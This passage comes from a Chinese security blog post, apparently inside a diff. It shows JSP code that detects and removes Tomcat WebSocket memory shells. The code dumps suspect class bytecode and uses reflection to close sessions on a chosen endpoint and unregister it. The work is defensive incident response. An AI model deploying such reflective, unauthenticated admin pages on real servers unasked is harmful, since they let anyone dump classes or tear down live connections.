class="string">&quot;configExactMatchMap&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Map&lt;String, Object&gt; configExactMatchMap = (Map&lt;String, Object&gt;) field.get(wsServerContainer);</span><br><span class="line"></span><br><span class="line">        configExactMatchMap.remove(webSocket);</span><br><span class="line">        out.write(<span class="string">&quot;&lt;input type=\&quot;button\&quot; name=\&quot;Submit\&quot; onclick=\&quot;javascript:window.location.replace(document.referrer);\&quot; value=\&quot;返回上一页\&quot;&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>效果如下（代码参考了：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-memshell-scanner">c0ny1 java-memshell-scanner</a>、<a target="_blank" rel="noopener" href="https://github.com/ruyueattention/java-memshell-scanner">ruyueattention java-memshell-scanner</a>）：</p>
+<p><img src="/image/post/2023/04/Info.png" alt="Info"></p>
+<p>这样不仅可以 dump 字节码，还可以清除内存马，<strong>但是对于已连接的 WebSocket 似乎不会生效</strong>，也就设说无法使已经连接上服务端木马的连接断开，然后我起初在 Session 类里发现了<code>close()</code>方法，但是没有找到一个很好的返回所有已建立 Session 连接的接口，然后在<code>org.apache.tomcat.websocket.server.WsServerContainer</code>里发现了<code>destroy()</code>方法，它的作用是这样的：</p>
+<blockquote>
+<p>Cleans up the resources still in use by WebSocket sessions created from this container. This includes closing sessions and cancelling Futures associated with blocking read&#x2F;writes</p>
+<p>清除从此容器创建的 WebSocket 会话仍在使用的资源。 这包括关闭会话和取消与阻塞读&#x2F;写相关的 Futures</p>
+</blockquote>
+<p>发现这样确实可以解决上面的问题：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.Repository&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URLEncoder&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.websocket.server.WsServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// dump 部分的代码需要写在 JSP 里，否则部分情况下会找不到要 dump 的 class</span></span><br><span class="line">    <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;class&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] classBytes = Repository.lookupClass(Class.forName(className)).getBytes();</span><br><span class="line">            response.addHeader(<span class="string">&quot;content-Type&quot;</span>, <span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> Class.forName(className).getSimpleName() + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">agent</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;User-Agent&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (agent.toLowerCase().indexOf(<span class="string">&quot;chrome&quot;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                response.addHeader(<span class="string">&quot;content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(filename.getBytes(<span class="string">&quot;UTF-8&quot;</span>), <span class="string">&quot;ISO8859-1&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                response.addHeader(<span class="string">&quot;content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(filename, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">ServletOutputStream</span> <span class="variable">outDumper</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">            outDumper.write(classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">            outDumper.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;kill&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">webSocket</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;kill&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">        <span class="type">WsServerContainer</span> <span class="variable">wsServerContainer</span> <span class="operator">=</span> (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; obj = Class.forName(<span class="string">&quot;org.apache.tomcat.websocket.server.WsServerContainer&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getDeclaredField(<span class="string">&quot;configExactMatchMap&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Map&lt;String, Object&gt; configExactMatchMap = (Map&lt;String, Object&gt;) field.get(wsServerContainer);</span><br><span class="line"></span><br><span class="line">        wsServerContainer.destroy();</span><br><span class="line"></span><br><span class="line">        configExactMatchMap.remove(webSocket);</span><br><span class="line">        out.write(<span class="string">&quot;&lt;input type=\&quot;button\&quot; name=\&quot;Submit\&quot; onclick=\&quot;javascript:window.location.replace(document.referrer);\&quot; value=\&quot;返回上一页\&quot;&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但这样似乎会影响到其它正常的 WebSocket 连接，接着上面的思路，找到了一种能返回所有（这里的所有是指定 WebSocket 路径下的所有连接）Session 的方法，这样就可以只断开我们所指定的 WebSocket 木马：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.Repository&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URLEncoder&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.websocket.server.WsServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.Session&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Set&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// dump 部分的代码需要写在 JSP 里，否则部分情况下会找不到要 dump 的 class</span></span><br><span class="line">    <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;class&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] classBytes = Repository.lookupClass(Class.forName(className)).getBytes();</span><br><span class="line">            response.addHeader(<span class="string">&quot;content-Type&quot;</span>, <span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> Class.forName(className).getSimpleName() + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">agent</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;User-Agent&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (agent.toLowerCase().indexOf(<span class="string">&quot;chrome&quot;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                response.addHeader(<span class="string">&quot;content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(filename.getBytes(<span class="string">&quot;UTF-8&quot;</span>), <span class="string">&quot;ISO8859-1&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                response.addHeader(<span class="string">&quot;content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(filename, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">ServletOutputStream</span> <span class="variable">outDumper</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">            outDumper.write(classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">            outDumper.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;kill&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">webSocket</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;kill&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">        <span class="type">WsServerContainer</span> <span class="variable">wsServerContainer</span> <span class="operator">=</span> (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; obj = Class.forName(<span class="string">&quot;org.apache.tomcat.websocket.server.WsServerContainer&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getDeclaredField(<span class="string">&quot;configExactMatchMap&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Map&lt;String, Object&gt; configExactMatchMap = (Map&lt;String, Object&gt;) field.get(wsServerContainer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.tomcat.websocket.WsWebSocketContainer&quot;</span>).getDeclaredMethod(<span class="string">&quot;getOpenSessions&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class&#125;);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Set&lt;Session&gt; sessions = (Set&lt;Session&gt;) method.invoke(wsServerContainer, webSocket);</span><br><span class="line">        <span class="keyword">for</span> (Session s : sessions) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">            count++;</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        configExactMatchMap.remove(webSocket);</span><br><span class="line">        out.write(<span class="string">&quot;清除了 &quot;</span> + webSocket + <span class="string">&quot; 关闭了 &quot;</span> + count + <span class="string">&quot; 个已存在的 WebSocket 连接&lt;/br&gt;&quot;</span>);</span><br><span class="line">        out.write(<span class="string">&quot;&lt;input type=\&quot;button\&quot; name=\&quot;Submit\&quot; onclick=\&quot;javascript:window.location.replace(document.referrer);\&quot; value=\&quot;返回上一页\&quot;&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对指定路径下的所有 WebSocket 连接调用<code>close()</code>方法，然后把对应的路径从<code>configExactMatchMap</code>移除：</p>
+<p><img src="/image/post/2023/04/Clear.png" alt="Clear"></p>
+<hr>
+<p>本文参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1673/">Tomcat WebSocket内存马原理浅析</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1935/">websocket 新型内存马的应急响应</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag"># 内存马</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/04/09/Go-%E5%8D%8F%E7%A8%8B-Tips/" rel="prev" title="Go 协程 Tips">
+                  <i class="fa fa-angle-left"></i> Go 协程 Tips
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/04/24/Tomcat-Agent-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/" rel="next" title="Tomcat Agent 型内存马">
+                  Tomcat Agent 型内存马 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陕ICP备2022001516号 </a>
+  </div>
+  <div class="copyright">
+    &copy; 2022 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Paoka1</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
